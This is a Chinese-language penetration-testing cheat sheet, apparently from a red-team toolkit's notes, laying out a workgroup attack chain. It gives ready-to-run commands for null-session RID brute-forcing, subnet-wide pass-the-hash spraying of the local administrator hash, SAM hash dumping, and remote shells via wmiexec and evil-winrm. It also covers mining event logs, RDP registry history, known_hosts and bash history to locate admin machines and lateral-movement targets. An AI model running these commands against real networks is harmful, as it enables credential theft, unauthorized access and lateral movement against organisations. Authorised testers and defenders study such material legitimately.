## 工作组五步全流程(无域环境的打法)

来源:nxc 实测(--local-auth/--rid-brute/--sam)+ TRICKS 工作组条

```bash
# ① 空会话枚举真实本地用户(Null Auth:True 才行;LOGON_FAILURE 后第一刀)
nxc smb <目标IP> -u '' -p '' --rid-brute

# ② 单哈希全网段喷(本地管理员密码复用是工作组命门)
nxc smb <网段>/24 -u administrator -H <NT哈希> --local-auth --continue-on-success

# ③ 命中机拉全量 SAM(新哈希=新一轮碰撞的弹药)
nxc smb <命中IP> -u administrator -H <NT哈希> --local-auth --sam

# ④ 雪球:每个新哈希回 ② 换着喷;判断价值先跑「哈希预检」

# ⑤ PTH 拿 shell(工作组写 .\ 或 主机名\,无 Kerberos 全走 NTLM)
impacket-wmiexec './administrator@<IP>' -hashes :<NT哈希>
evil-winrm -i <IP> -u administrator -H <NT哈希>    # 5985 开放首选
```

参数速查:`--local-auth`(本地 SAM 认证,工作组必加)| `--rid-brute`(RID 顺序枚举用户)| `--continue-on-success`(喷洒不中断)| 哈希 `31d6cfe0…` 开头=空密码直接跳过

注意:审计留痕 4625(失败)/4624 类型 3(成功);签名 False 的机器同时可当中继目标(10 号 §1.5);执行台跑会自动挂 fail_hints 失败建议。

## 连接溯源两问(谁连过来的/连过谁)

来源:nxc -X(WMI 远程执行,--help 实测)/sshpass(本机);注册表/命令为系统自带

**问一:管理员此刻/历史从哪个 IP 连过来**(找攻击者视角的"上游"——管理机)

```bash
# Windows · 实时(执行台「在线会话狩猎」/nxc;--loggedon-users 网络会话带来源)
nxc smb <网段>/24 -u <用户> -p '<密码>' --sessions --loggedon-users
# Windows · 远程一键(执行台「Windows 连接溯源」):net sessions(SMB 会话来源)+ netstat ESTABLISHED

# Windows · 历史登录来源(事件日志,需 shell):
#   PowerShell: Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
#     Where-Object {$_.Properties[8].Value -in 3,10} |          # LogonType 3=网络 10=RDP
#     Select-Object TimeCreated,@{n='来源IP';e={$_.Properties[18].Value}},@{n='用户';e={$_.Properties[5].Value}}
#   RDP 上下线:4778/4779;显式凭据(管理员双跳):4648(含目标机器+来源)

# Linux(执行台「Linux 连接溯源」一键):
last -F -a | head -20          # 登录历史+来源 IP(-a 主机名在最后一列)
lastb -a | head                # 失败登录(爆破痕迹=也在告诉你谁在连)
```

**问二:这台连过哪些 IP**(找"下游"——它管谁/跳板去哪)

```bat
:: Windows(执行台「Windows 连接溯源」含此项)
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s   :: RDP 连过的主机历史(用户习惯暴露管理面)
arp -a                                                                  :: 近期通信过的内网邻居
type %APPDATA%\Microsoft\Windows\Recent\*.lnk 2>nul                     :: 最近文件思路(Office/共享路径痕迹)
```

```bash
# Linux(一键含):known_hosts 是"连过谁"的铁证
cat ~/.ssh/known_hosts | awk '{print $1}' | sort -u      # SSH 连过的全部主机
grep -hE 'ssh |scp ' ~/.bash_history | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sort -u
ss -tnp                                                   # 当前出站(管理隧道/数据库/跳板)
```

注意:4624 采集量大时按时间窗过滤;known_hosts 可被 hash(HashKnownHosts 开启时只有哈希,标注局限);溯源结论进项目 notes.md → report.sh 时间线。
